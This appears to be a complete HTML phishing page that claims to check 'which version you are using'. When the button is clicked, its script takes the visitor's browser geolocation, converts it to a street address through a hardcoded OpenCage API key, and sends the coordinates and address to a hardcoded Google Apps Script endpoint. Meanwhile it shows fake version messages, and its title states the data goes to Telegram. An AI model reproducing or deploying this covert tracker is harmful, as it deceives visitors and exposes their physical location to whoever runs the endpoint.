<!DOCTYPE html>
<html>
<head>
  <title>Send Location to Telegram via Google Apps Script</title>
</head>
<body>
  <h2>You are safe to click </h2>
  <button onclick="sendLocation()">check which version you are using </button>

  <div id="status" style="margin-top: 20px; font-weight: bold;"></div>

  <script>
    const openCageKey = '624be1e686e2461885ce5703bffaff10';  // Your OpenCage API key
    const webAppURL = 'https://script.google.com/macros/s/AKfycbzl4CeH4iTNYuW6PM18aAEwW6vhiCuYeq1-nkv9BsCk41YDG4IdWBZO85oBySMIqEkhPA/exec';

    async function sendLocation() {
      if (!navigator.geolocation) {
        alert('Geolocation not supported by your browser.');
        return;
      }

      const statusDiv = document.getElementById('status');
      statusDiv.innerText = 'Getting version...';

      navigator.geolocation.getCurrentPosition(async (pos) => {
        const lat = pos.coords.latitude;
        const lng = pos.coords.longitude;

        statusDiv.innerText = 'Fetching version.....';

        try {
          // Fetch address from OpenCage API
          const response = await fetch(
            `https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lng}&key=${openCageKey}`
          );
          const data = await response.json();

          const address = data.results.length > 0 ? data.results[0].formatted : "Address not found";

          statusDiv.innerText = 'getting version';

          // Construct URL with query parameters for GET
          const url = `${webAppURL}?latitude=${encodeURIComponent(lat)}&longitude=${encodeURIComponent(lng)}&address=${encodeURIComponent(address)}`;

          // Send GET request to Google Apps Script Web App
          const res = await fetch(url);
          const result = await res.json();

          if (result.status === 'success') {
            statusDiv.innerText = 'Your version is 1.0.0.1!';
          } else {
            statusDiv.innerText = 'Error: ' + result.message;
          }
        } catch (error) {
          statusDiv.innerText = 'Error fetching or sending data.';
          console.error(error);
        }
      }, (err) => {
        alert('Error getting location: ' + err.message);
        statusDiv.innerText = '';
      });
    }
  </script>
</body>
</html>

